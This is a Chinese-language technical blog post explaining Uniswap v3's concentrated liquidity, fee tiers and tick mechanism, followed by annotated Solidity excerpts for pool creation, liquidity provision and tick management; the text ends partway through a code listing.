V3中将流动性集中在一个有限范围内称为头寸，一个头寸只需要保持足够的储备来支持其范围内的交易，就像V2的一个池子一样。</p><p>在Uniswap v3中，LP可以将资金集中在自定义价格范围内，以所需的价格提供更多的流动性。在此过程中，LP构建了反映其自身偏好的个性化价格曲线。<br><img src="uniswap01.png" alt=""><br>LP可以在单个池中组合任意数量的不同集中头寸。例如，ETH/DAI 池中的 LP 可以选择将 $100 分配给 $1，000-$2，000 的价格范围，并将 $50 分配给 $1，500-$1，750。</p><h3 id="资本效率"><a href="#资本效率" class="headerlink" title="资本效率"></a>资本效率</h3><p>通过集中其流动性，LP可以在指定的价格范围内提供与v2相同的流动性深度，同时将更少的资本置于风险中。节省的资金可以存放在外部，投资于不同的资产，存放在DeFi的其他地方，或用于在指定的价格范围内增加敞口以赚取更多的交易费用。<br><img src="uniswap03.png" alt=""><br><img src="uniswap04.png" alt=""></p><p>让我们举个例子来说明：</p><blockquote><p>Alice和Bob都想在Uniswap v3上的ETH/DAI池中提供流动性，他们每人有100万美元，目前ETH的价格是1500DAI。<br>Alice决定在整个价格范围内部署她的资本(就像她在Uniswap v2中一样)，于是她存入50万DAI和333.33ETH(共值100万美元)<br>Bob则建立了一个集中的仓位，只在1000到2250的价格范围内存款，他存入了91751DAI和61.17ETH，总价值约18.35万美元，他自己保留了另外的81.65万美元，按照自己的喜好进行投资。<br>此时Alice投入的资金是Bob的5.44倍，但只要ETH/DAI价格保持在1000到2250的区间内，则他们赚取的费用是一样的。</p></blockquote><p><img src="example_1.png" alt=""><br>Bob的定制仓位也是他流动资金的一种止损，如果ETH价格跌至0美元，Alice和Bob的流动资金都将完全以ETH计价，然而Bob将只损失15.9万美元，而Alice则损失100万美元，Bob可以用他额外的816,500美元来对冲下行风险，或者投资于任何其他可以想象的策略。<br><img src="example_2.png" alt=""><br>Uniswap v3中LP不需要像v2中的LP那样以较少的资本提供同等的流动性深度，而是可以选择与v2 LP一样以相同的资本量提供更大的深度，这就需要承担更多的价格风险(无常损失)，同时支持更多的交易量，赚取更高的费用.</p><h3 id="活跃的流动性"><a href="#活跃的流动性" class="headerlink" title="活跃的流动性"></a>活跃的流动性</h3><p>如果市场价格超出LP的指定价格范围，则其流动性将从池中有效移除，并且不再赚取费用。在这种状态下，LP的流动性完全由两种资产中价值较低的资产组成，直到市场价格回到其指定的价格范围，或者他们决定更新其范围以考虑当前价格。<br><img src="uniswap05.png" alt=""><br><img src="uniswap06.png" alt=""></p><h3 id="范围订单"><a href="#范围订单" class="headerlink" title="范围订单"></a>范围订单</h3><p>非常小的范围内的头寸的作用类似于限价单——如果超出范围，头寸将从完全由一种资产组成，转变为完全由另一种资产组成(加上应计费用)，这个范围指令和传统的限价指令有两个区别:</p><ul><li>一个仓位的范围有多窄是有限制的，当价格在这个范围内时，限价单可能会被部分执行</li><li>当仓位被越过时，它需要撤回，如果价格回穿该范围，则该头寸将被交易回，从而有效地逆转交易<br><img src="uniswap07.png" alt=""></li></ul><h3 id="灵活的手续费选择"><a href="#灵活的手续费选择" class="headerlink" title="灵活的手续费选择"></a>灵活的手续费选择</h3><p>v3 版本内置了三种梯度的手续费率（0.05%, 0.30%, and 1.00%），同时可以在未来增加更多的费率值。关于手续费的计算过程，这部分放在后文来详解。需要注意的是，由于需要支持多种费率，同一个代币对 v3 版本会有多个不同的流动池。例如 ETH/DAI 代币对，会分成三个池，分别对应 0.05%, 0.30%, 1.00% 的手续费。</p><h3 id="价格精度问题"><a href="#价格精度问题" class="headerlink" title="价格精度问题"></a>价格精度问题</h3><p>因为用户可以在任意 [P0,P1] 价格区间内提供流动性，Uniswap v3 需要保存每一个用户提供流动性的边界价格，即 P0 和 P1。这样就引入了一个新的问题，假设两个用户提供的流动性价格下限分别是 5.00000001 和 5.00000002，那么 Uniswap 需要标记价格为 5.00000001 和 5.00000002 的对应的流动性大小。同时当交易发生时，需要将 [5.00000001,5.00000002] 作为一个单独的价格区间进行计算。这样会导致：</p><ul><li>几乎很难有两个流动性设置相同的价格边界，这样会导致消耗大量合约存储空间保存这些状态</li><li>当进行交易计算时，价格变化被切分成很多个小的范围区间，需要逐一分段进行计算，这会消耗大量的 gas，并且如果范围的价差太小，可能会引发计算精度的问题</li></ul><p>Uniswap v3 解决这个问题的方式是，将 [Pmin,Pmax] 这一段连续的价格范围为，分割成有限个离散的价格点。每一个价格对应一个 <strong>tick</strong>，用户在设置流动性的价格区间时，只能选择这些离散的价格点中的某一个作为流动性的边界价格。<br>Uniswap v3 采用了等比数列的形式确定价格数列，公比为 1.0001。即下一个价格点为当前价格点的 100.01%。<br>如此一来 Uniswap v3 可以提供比较细粒度的价格选择范围（每个可选价格之间的差值为 0.01%），同时又可以将计算的复杂度控制在一定范围内。</p><h3 id="tick-管理"><a href="#tick-管理" class="headerlink" title="tick 管理"></a>tick 管理</h3><p>简单说，一个 tick 就代表 Uniswap 价格的等比数列中的某一个价格(公比为1.001)，因此每一个用户提供的流动性的价格边界可以用 ticklower 和 tickupper 来表示。为了计算的方便，对于每一个交易对，uni 都定义有一个价格为 1 的 tick。</p><pre><code>这样一来，只需要通过整数索引 i 就能找到对应的 tick，并且 i 为 0 时价格为 1.</code></pre><p>Uniswap 不需要记录每个 tick 所有的信息，只需要记录所有作为 upper/lower tick 所包含的流动性元数据即可。看下面这个例子：<br><img src="uniswap08.jpg" alt=""><br>两个用户分别在 [a,c] 和 [b,d] 两个区间提供了流动性 L1 和 L2，对于 Uniswap 来说它会在 a, b, c, d 四个 tick 上记录对应的流动性增减情况。例如当价格从图中从左向右移动时，代币池的流动性需要做对应的增减（即从左侧 tick 进入一个流动性时增加流动性，移出流动性的右侧 tick 时减去相应的流动性）。</p><ul><li><strong>手续费与 tick 的关系</strong><br>我们知道tick越多，价格可选的值越细，但是合约在计算时候的价格区间就可能越多，那么 gas 消耗也会更加的多，因此我们需要让 tick 的数量保持在一个合理的范围内。Uniswap 针对不同类型的代币对推荐使用不同类型的费率。<br>例如稳定比交易对 USDC/USDT，它的范围波动比较小，我们需要给它更精细的价格可选值，并且设置一个比较低的手续费（0.05%）。Uniswap 引入了 tickSpacing 的概念，即每个 tick 之间跳过 N 个 tick，这样让合约在计算的时候，gas 更可控。<br>对于价格波动较小的交易池，我们希望 tickSpacing 更小，这样价格可选值更多，同时也希望费率更低。反之波动大的交易对，可以让 tickSpacing 更大，这样更节约 gas，但是我们希望它的费率更高。</li></ul><h2 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h2><h3 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h3><p>v3的代码结构和v2几乎没有区别，将合约分成了两个仓库：</p><ul><li><a href="https://github.com/Uniswap/uniswap-v3-core" target="_blank" rel="noopener">uniswap-v3-core</a></li><li><a href="https://github.com/Uniswap/uniswap-v3-periphery" target="_blank" rel="noopener">uniswap-v3-periphery</a></li></ul><p>core 仓库的功能主要包含在以下 2 个合约中：</p><ul><li><p><strong>UniswapV3Factory</strong>：提供创建 pool 的接口，并且追踪所有的 pool</p></li><li><p><strong>UniswapV3Pool</strong>：实现代币交易，流动性管理，交易手续费的收取，oracle 数据管理。接口的实现粒度比较低，不适合普通用户使用，错误的调用其中的接口可能会造成经济上的损失。</p></li></ul><p>periphery仓库的功能主要包含在以下2个合约中：</p><ul><li><strong>SwapRouter</strong>：提供代币交易的接口，它是对 UniswapV3Pool 合约中交易相关接口的进一步封装，前端界面主要与这个合约来进行对接。</li><li><strong>NonfungiblePositionManager：</strong> 用来增加/移除/修改 Pool 的流动性，并且通过 NFT token 将流动性代币化。使用 ERC721 token（v2 使用的是 ERC20）的原因是同一个池的多个流动性并不能等价替换（v3 的集中流性动功能）。</li></ul><p><img src="uniswap_structur.png" alt=""><br>这是uniswap v3基本的一个架构，其主要业务流程是在Management和Pool之间进行交互。<br>NonfungiblePositionManager负责交易池的创建以及流动性的添加删除。SwapRouter是swap路由的管理。UniswapV3Factory是交易池(UniswapV3Pool)统一创建的接口。UniswapV3Pool由UniswapV3PoolDeployer统一部署。UniswapV3Pool是核心逻辑，管理了Tick和Position，实现流动性管理以及一个交易池中swap功能实现。每个Pool中的Position都做成了ERC721的Token。也就是说，每个Position都有独立的ERC721的Token ID。</p><h3 id="创建交易对"><a href="#创建交易对" class="headerlink" title="创建交易对"></a>创建交易对</h3><p>创建交易对的调用流程如下：<br><img src="uniswap_pair.png" alt=""><br>用户首先调用<code>NonfungiblePositionManager</code>合约继承的<code>createAndInitializePoolIfNecessary</code>方法创建交易对，传入的参数为交易对的 token0, token1, fee 和初始价格。</p><p>createAndInitializePoolIfNecessary 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function createAndInitializePoolIfNecessary(</span><br><span class="line">        address token0,</span><br><span class="line">        address token1,</span><br><span class="line">        uint24 fee,</span><br><span class="line">        uint160 sqrtPriceX96</span><br><span class="line">    ) external payable override returns (address pool) &#123;</span><br><span class="line">        require(token0 &lt; token1);</span><br><span class="line">        pool &#x3D; IUniswapV3Factory(factory).getPool(token0, token1, fee);</span><br><span class="line"></span><br><span class="line">        if (pool &#x3D;&#x3D; address(0)) &#123;</span><br><span class="line">            pool &#x3D; IUniswapV3Factory(factory).createPool(token0, token1, fee);  &#x2F;&#x2F;创建pool</span><br><span class="line">            IUniswapV3Pool(pool).initialize(sqrtPriceX96);                      &#x2F;&#x2F;初始化</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            (uint160 sqrtPriceX96Existing, , , , , , ) &#x3D; IUniswapV3Pool(pool).slot0();</span><br><span class="line">            if (sqrtPriceX96Existing &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                IUniswapV3Pool(pool).initialize(sqrtPriceX96);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>createAndInitializePoolIfNecessary</code>方法内部通过调用 UniswapV3Factory 的 <code>createPool</code> 方法完成交易对的创建，然后对交易对进行初始化，初始化的作用就是给交易对设置一个初始的价格。</p><p>首先调用<code>UniswapV3Factory.getPool</code>方法查看交易对是否已经创建,<code>getPool</code>函数是 solidity 自动为 <code>UniswapV3Factory</code> 合约中的状态变量<code>getPool</code>生成的外部函数<code>getPool</code>的数据类型为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall &#123;</span><br><span class="line">    ...</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; mapping(uint24 &#x3D;&gt; address))) public override getPool;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 3个 map 说明了 v3 版本使用 (tokenA, tokenB, fee) 来作为一个交易对的键，即相同代币，不同费率之间的流动池不一样。另外对于给定的 tokenA 和 tokenB，会先将其地址排序，将地址值更小的放在前，这样方便后续交易池的查询和计算。</p><p>再来看 UniswapV3Factory <strong>创建交易对的过程</strong>，实际上它是调用<code>deploy</code>函数完成交易对的创建：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function deploy(</span><br><span class="line">    address factory,</span><br><span class="line">    address token0,</span><br><span class="line">    address token1,</span><br><span class="line">    uint24 fee,</span><br><span class="line">    int24 tickSpacing</span><br><span class="line">) internal returns (address pool) &#123;</span><br><span class="line">    parameters &#x3D; Parameters(&#123;factory: factory, token0: token0, token1: token1, fee: fee, tickSpacing: tickSpacing&#125;);</span><br><span class="line">    pool &#x3D; address(new UniswapV3Pool&#123;salt: keccak256(abi.encode(token0, token1, fee))&#125;());</span><br><span class="line">    delete parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里采用了<code>Create2</code>的方式创建Pool池，关于Create2的使用，可以看我的另一篇文章。<br>这里简单讲一下使用Create2的好处</p><ul><li>可以在链下计算出已经创建的交易池的地址</li><li>其他合约不必通过<code>UniswapV3Factory</code>中的接口来查询交易池的地址，可以节省 gas</li><li>合约地址不会因为 reorg 而改变</li></ul><p>我们再来看一下<code>UniswapV3Pool</code>的构造函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">    int24 _tickSpacing;</span><br><span class="line">    (factory, token0, token1, fee, _tickSpacing) &#x3D; IUniswapV3PoolDeployer(msg.sender).parameters();</span><br><span class="line">    tickSpacing &#x3D; _tickSpacing;</span><br><span class="line"></span><br><span class="line">    maxLiquidityPerTick &#x3D; Tick.tickSpacingToMaxLiquidityPerTick(_tickSpacing);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较值得注意的是这里反向查询了Deployer里面的<code>parameters</code>变量进行赋值，而不是通过传参的方式。<br>其实是因为Create2。这是因为<code>CREATE2</code>会将合约的 <code>initcode</code> 和 <code>salt</code> 一起用来计算创建出的合约地址。而 <code>initcode</code> 是包含 <code>contructor code</code> 和其参数的，如果合约的 <code>constructor</code> 函数包含了参数，那么其 initcode将因为其传入参数不同而不同。</p><p>为了让合约地址的计算更简单，这里的 constructor 不包含参数（这样合约的 initcode 将时唯一的），是使用动态 call 的方式来获取其创建参数。</p><p>最后，对创建的交易对合约进行初始化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function initialize(uint160 sqrtPriceX96) external override &#123;</span><br><span class="line">    require(slot0.sqrtPriceX96 &#x3D;&#x3D; 0, &#39;AI&#39;);</span><br><span class="line"></span><br><span class="line">    int24 tick &#x3D; TickMath.getTickAtSqrtRatio(sqrtPriceX96);</span><br><span class="line"></span><br><span class="line">    (uint16 cardinality, uint16 cardinalityNext) &#x3D; observations.initialize(_blockTimestamp());</span><br><span class="line"></span><br><span class="line">    slot0 &#x3D; Slot0(&#123;</span><br><span class="line">        sqrtPriceX96: sqrtPriceX96,</span><br><span class="line">        tick: tick,</span><br><span class="line">        observationIndex: 0,</span><br><span class="line">        observationCardinality: cardinality,</span><br><span class="line">        observationCardinalityNext: cardinalityNext,</span><br><span class="line">        feeProtocol: 0,</span><br><span class="line">        unlocked: true</span><br><span class="line">    &#125;);</span><br><span class="line">    &#x2F;&#x2F; 此时池子中还没有流动性</span><br><span class="line">    emit Initialize(sqrtPriceX96, tick);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>初始化主要是设置了交易池的初始价格（注意，此时池子中还没有流动性），以及费率，tick 等相关变量的初始化。完成之后一个交易池就创建好了。</p><h3 id="提供流动性"><a href="#提供流动性" class="headerlink" title="提供流动性"></a>提供流动性</h3><p>在合约内 v3会保存所有用户的流动性，代码内称作<code>Position</code>，<br><img src="uniswap10.png" alt=""><br>用户还是首先和<code>NonfungiblePositionManager</code>合约交互,调用<code>mint</code>函数，mint函数会调用<code>LiquidityManagement.sol</code>里的<code>addLiquidity</code>函数，来进行流动性的增添。v3 这次将 ERC20 的 LP token 改成了 ERC721 token，并且将 token 功能放到<code>NonfungiblePositionManager</code>合约中。这个合约替代用户完成提供流动性操作，然后根据将流动性的数据元记录下来，并给用户铸造一个 NFT Token.</p><p>我们先来看添加流动性的函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">struct AddLiquidityParams &#123;</span><br><span class="line">    address token0;     &#x2F;&#x2F; token0 的地址</span><br><span class="line">    address token1;     &#x2F;&#x2F; token1 的地址</span><br><span class="line">    uint24 fee;         &#x2F;&#x2F; 交易费率</span><br><span class="line">    address recipient;  &#x2F;&#x2F; 流动性的所属人地址</span><br><span class="line">    int24 tickLower;    &#x2F;&#x2F; 流动性的价格下限（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    int24 tickUpper;    &#x2F;&#x2F; 流动性的价格上线（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    uint128 amount;     &#x2F;&#x2F; 流动性 L 的值</span><br><span class="line">    uint256 amount0Max; &#x2F;&#x2F; 提供的 token0 上限数</span><br><span class="line">    uint256 amount1Max; &#x2F;&#x2F; 提供的 token1 上限数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addLiquidity(AddLiquidityParams memory params)</span><br><span class="line">    internal</span><br><span class="line">    returns (</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1,</span><br><span class="line">        IUniswapV3Pool pool</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    PoolAddress.PoolKey memory poolKey &#x3D;</span><br><span class="line">        PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 这里不需要访问 factory 合约，可以通过 token0, token1, fee 三个参数计算出 pool 的合约地址</span><br><span class="line">    pool &#x3D; IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));</span><br><span class="line"></span><br><span class="line">    (amount0, amount1) &#x3D; pool.mint(</span><br><span class="line">        params.recipient,</span><br><span class="line">        params.tickLower,</span><br><span class="line">        params.tickUpper,</span><br><span class="line">        params.amount,</span><br><span class="line">        &#x2F;&#x2F; pool 合约回调所使用的参数</span><br><span class="line">        abi.encode(MintCallbackData(&#123;poolKey: poolKey, payer: msg.sender&#125;))</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    require(amount0 &lt;&#x3D; params.amount0Max);</span><br><span class="line">    require(amount1 &lt;&#x3D; params.amount1Max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><p>在uniswap v3中有个比较特殊的设计就是在提供流动性的流程中，不是在代码逻辑内部进行token和流动性的转换，而实通过回调函数的方式进行<strong>转账</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct MintCallbackData &#123;</span><br><span class="line">    PoolAddress.PoolKey poolKey;</span><br><span class="line">    address payer;         &#x2F;&#x2F; 支付 token 的地址</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F; @inheritdoc IUniswapV3MintCallback</span><br><span class="line">function uniswapV3MintCallback(</span><br><span class="line">    uint256 amount0Owed,</span><br><span class="line">    uint256 amount1Owed,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override &#123;</span><br><span class="line">    MintCallbackData memory decoded &#x3D; abi.decode(data, (MintCallbackData));</span><br><span class="line">    CallbackValidation.verifyCallback(factory, decoded.poolKey);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 根据传入的参数，使用 transferFrom 代用户向 Pool 中支付 token</span><br><span class="line">    if (amount0Owed &gt; 0) pay(decoded.poolKey.token0, decoded.payer, msg.sender, amount0Owed);</span><br><span class="line">    if (amount1Owed &gt; 0) pay(decoded.poolKey.token1, decoded.payer, msg.sender, amount1Owed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用回调函数原因是，将<code>Position</code>的<code>owner</code>和实际流动性<code>token</code>支付者解耦。这样可以让中间合约来管理用户的流动性，并将流动性<code>token</code>化。关于<code>token</code>化，Uniswap v3 默认实现了 ERC721 token（因为即使是同一个池子，流动性之间差异也也很大）。</p><h4 id="Tick管理"><a href="#Tick管理" class="headerlink" title="Tick管理"></a>Tick管理</h4><p>Tick合约包含用于管理报价过程和相关计算的函数，下面我们进行逐一分析：</p><p>首先声明一个<code>info</code>结构体，用于存储每个初始化后个人的trick信息，具体代码如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct Info &#123;</span><br><span class="line">    &#x2F;&#x2F; the total position liquidity that references this tick</span><br><span class="line">    uint128 liquidityGross;</span><br><span class="line">    &#x2F;&#x2F; amount of net liquidity added (subtracted) when tick is crossed from left to right (right to left),</span><br><span class="line">    int128 liquidityNet;</span><br><span class="line">    &#x2F;&#x2F; fee growth per unit of liquidity on the _other_ side of this tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint256 feeGrowthOutside0X128;</span><br><span class="line">    uint256 feeGrowthOutside1X128;</span><br><span class="line">    &#x2F;&#x2F; the cumulative tick value on the other side of the tick</span><br><span class="line">    int56 tickCumulativeOutside;</span><br><span class="line">    &#x2F;&#x2F; the seconds per unit of liquidity on the _other_ side of this tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint160 secondsPerLiquidityOutsideX128;</span><br><span class="line">    &#x2F;&#x2F; the seconds spent on the other side of the tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint32 secondsOutside;</span><br><span class="line">    &#x2F;&#x2F; true iff the tick is initialized, i.e. the value is exactly equivalent to the expression liquidityGross !&#x3D; 0</span><br><span class="line">    &#x2F;&#x2F; these 8 bits are set to prevent fresh sstores when crossing newly initialized ticks</span><br><span class="line">    bool initialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>tickSpacingToMaxLiquidityPerTick</code>函数用于根据给定的tickSpacing得出每一个trick的最大流动性值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;e.g., a tickSpacing of 3 requires ticks to be initialized every 3rd tick i.e., ..., -6, -3, 0, 3, 6, ...</span><br><span class="line">&#x2F;&#x2F; @return The max liquidity per tick</span><br><span class="line">function tickSpacingToMaxLiquidityPerTick(int24 tickSpacing) internal pure returns (uint128) &#123;</span><br><span class="line">    int24 minTick &#x3D; (TickMath.MIN_TICK &#x2F; tickSpacing) * tickSpacing;</span><br><span class="line">    int24 maxTick &#x3D; (TickMath.MAX_TICK &#x2F; tickSpacing) * tickSpacing;</span><br><span class="line">    uint24 numTicks &#x3D; uint24((maxTick - minTick) &#x2F; tickSpacing) + 1;</span><br><span class="line">    return type(uint128).max &#x2F; numTicks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>getFeeGrowthInside</code>函数用于检查费用增长的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function getFeeGrowthInside(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    int24 tickCurrent,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128</span><br><span class="line">) internal view returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) &#123;</span><br><span class="line">    Info storage lower &#x3D; self[tickLower];</span><br><span class="line">    Info storage upper &#x3D; self[tickUpper];</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; calculate fee growth below</span><br><span class="line">    uint256 feeGrowthBelow0X128;</span><br><span class="line">    uint256 feeGrowthBelow1X128;</span><br><span class="line">    if (tickCurrent &gt;&#x3D; tickLower) &#123;</span><br><span class="line">        feeGrowthBelow0X128 &#x3D; lower.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthBelow1X128 &#x3D; lower.feeGrowthOutside1X128;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        feeGrowthBelow0X128 &#x3D; feeGrowthGlobal0X128 - lower.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthBelow1X128 &#x3D; feeGrowthGlobal1X128 - lower.feeGrowthOutside1X128;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; calculate fee growth above</span><br><span class="line">    uint256 feeGrowthAbove0X128;</span><br><span class="line">    uint256 feeGrowthAbove1X128;</span><br><span class="line">    if (tickCurrent &lt; tickUpper) &#123;</span><br><span class="line">        feeGrowthAbove0X128 &#x3D; upper.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthAbove1X128 &#x3D; upper.feeGrowthOutside1X128;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        feeGrowthAbove0X128 &#x3D; feeGrowthGlobal0X128 - upper.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthAbove1X128 &#x3D; feeGrowthGlobal1X128 - upper.feeGrowthOutside1X128;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    feeGrowthInside0X128 &#x3D; feeGrowthGlobal0X128 - feeGrowthBelow0X128 - feeGrowthAbove0X128;</span><br><span class="line">    feeGrowthInside1X128 &#x3D; feeGrowthGlobal1X128 - feeGrowthBelow1X128 - feeGrowthAbove1X128;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>update</code>函数用于更新trick，每当trick从初始化转为未初始化时需要更新trick并返回真，反之亦然.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 